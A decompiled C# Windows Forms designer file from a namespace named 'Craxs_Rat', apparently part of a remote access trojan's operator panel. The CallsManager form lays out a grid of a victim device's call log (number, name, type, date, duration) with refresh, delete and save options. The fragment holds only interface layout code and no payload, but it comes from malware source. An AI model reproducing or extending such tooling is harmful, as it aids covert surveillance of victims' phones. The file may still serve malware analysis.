namespace Craxs_Rat
{
	// Token: 0x020000A8 RID: 168
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class CallsManager : global::System.Windows.Forms.Form
	{
		// Token: 0x06000A5E RID: 2654 RVA: 0x00071DD4 File Offset: 0x0006FFD4
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000A5F RID: 2655 RVA: 0x00071E18 File Offset: 0x00070018
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			this.DGV0 = new global::System.Windows.Forms.DataGridView();
			this.ctxMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.RefreshToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.DeleteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SaveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SaveAsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.PB = new global::System.Windows.Forms.ProgressBar();
			this.BoxTitle = new global::System.Windows.Forms.PictureBox();
			this.Column1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column6 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column9 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column7 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column2 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column3 = new global::System.Windows.Forms.DataGridViewImageColumn();
			((global::System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
			this.ctxMenu.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.BoxTitle).BeginInit();
			base.SuspendLayout();
			this.DGV0.AllowUserToAddRows = false;
			this.DGV0.AllowUserToDeleteRows = false;
			this.DGV0.AllowUserToResizeColumns = false;
			this.DGV0.AllowUserToResizeRows = false;
			this.DGV0.AutoSizeColumnsMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
			this.DGV0.AutoSizeRowsMode = global::System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
			this.DGV0.BackgroundColor = global::System.Drawing.Color.Black;
			this.DGV0.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.DGV0.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.DGV0.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.Black;
			dataGridViewCellStyle.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.SystemColors.Highlight;
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
			dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.DGV0.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.DGV0.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column1,
				this.Column6,
				this.Column9,
				this.Column7,
				this.Column2,
				this.Column3
			});
			this.DGV0.ContextMenuStrip = this.ctxMenu;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.Black;
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Arial", 8.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.Black;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.DGV0.DefaultCellStyle = dataGridViewCellStyle2;
			this.DGV0.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.DGV0.EditMode = global::System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
			this.DGV0.EnableHeadersVisualStyles = false;
			this.DGV0.GridColor = global::System.Drawing.Color.FromArgb(42, 42, 42);
			this.DGV0.Location = new global::System.Drawing.Point(0, 0);
			this.DGV0.Name = "DGV0";
			this.DGV0.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
			this.DGV0.RowHeadersVisible = false;
			this.DGV0.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.DGV0.Size = new global::System.Drawing.Size(414, 213);
			this.DGV0.TabIndex = 2;
			this.ctxMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RefreshToolStripMenuItem,
				this.DeleteToolStripMenuItem,
				this.SaveToolStripMenuItem,
				this.SaveAsToolStripMenuItem
			});
			this.ctxMenu.Name = "ctxMenu";
			this.ctxMenu.ShowImageMargin = false;
			this.ctxMenu.Size = new global::System.Drawing.Size(90, 92);
			this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
			this.RefreshToolStripMenuItem.Size = new global::System.Drawing.Size(89, 22);
			this.RefreshToolStripMenuItem.Text = "Refresh";
			this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
			this.DeleteToolStripMenuItem.Size = new global::System.Drawing.Size(89, 22);
			this.DeleteToolStripMenuItem.Text = "Delete";
			this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
			this.SaveToolStripMenuItem.Size = new global::System.Drawing.Size(89, 22);
			this.SaveToolStripMenuItem.Text = "Save";
			this.SaveToolStripMenuItem.Visible = false;
			this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
			this.SaveAsToolStripMenuItem.Size = new global::System.Drawing.Size(89, 22);
			this.SaveAsToolStripMenuItem.Text = "Save As";
			this.SaveAsToolStripMenuItem.Visible = false;
			this.TOpacity.Interval = 1;
			this.PB.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.PB.Location = new global::System.Drawing.Point(0, 213);
			this.PB.Name = "PB";
			this.PB.Size = new global::System.Drawing.Size(414, 10);
			this.PB.TabIndex = 6;
			this.BoxTitle.BackColor = global::System.Drawing.Color.Black;
			this.BoxTitle.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.BoxTitle.ErrorImage = null;
			this.BoxTitle.InitialImage = null;
			this.BoxTitle.Location = new global::System.Drawing.Point(0, 223);
			this.BoxTitle.Name = "BoxTitle";
			this.BoxTitle.Size = new global::System.Drawing.Size(414, 18);
			this.BoxTitle.TabIndex = 7;
			this.BoxTitle.TabStop = false;
			this.Column1.HeaderText = "number";
			this.Column1.Name = "Column1";
			this.Column1.Width = 74;
			this.Column6.HeaderText = "name";
			this.Column6.Name = "Column6";
			this.Column6.Width = 61;
			this.Column9.HeaderText = "type";
			this.Column9.Name = "Column9";
			this.Column9.Width = 54;
			this.Column7.HeaderText = "date";
			this.Column7.Name = "Column7";
			this.Column7.Width = 54;
			this.Column2.HeaderText = "duration";
			this.Column2.Name = "Column2";
			this.Column2.Width = 76;
			this.Column3.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
			this.Column3.FillWeight = 1f;
			this.Column3.HeaderText = "";
			this.Column3.MinimumWidth = 2;
			this.Column3.Name = "Column3";
			this.Column3.SortMode = global::System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
			this.Column3.Width = 2;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(414, 241);
			base.Controls.Add(this.DGV0);
			base.Controls.Add(this.PB);
			base.Controls.Add(this.BoxTitle);
			base.Name = "CallsManager";
			base.Opacity = 0.0;
			this.Text = "CallsManager";
			((global::System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
			this.ctxMenu.ResumeLayout(false);
			((global::System.ComponentModel.ISupportInitialize)this.BoxTitle).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x040005D1 RID: 1489
		private global::System.ComponentModel.Container components;
	}
}
